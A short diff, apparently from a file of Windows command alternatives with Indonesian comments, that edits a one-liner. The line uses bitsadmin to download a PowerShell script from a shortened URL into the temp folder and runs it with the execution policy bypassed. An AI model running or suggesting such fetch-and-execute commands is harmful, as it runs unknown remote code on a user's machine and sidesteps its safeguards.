@@ -23,7 +23,7 @@ powershell -ep Bypass -Command ^
 
 atau
 //mantep
-c:\windows\system32\cmd.exe /c "bitsadmin /transfer getScript /download /priority high https://s.id/iexambanbk %temp%\i.ps1 & powershell -ep Bypass -File %temp%\i.ps1"
+c:\windows\system32\cmd.exe /c "del /q %tmp%\i.ps1 & bitsadmin /transfer getScript /download /priority high https://s.id/iexambanbk %temp%\i.ps1 & powershell -ep Bypass -File %temp%\i.ps1"
 
 atau
 
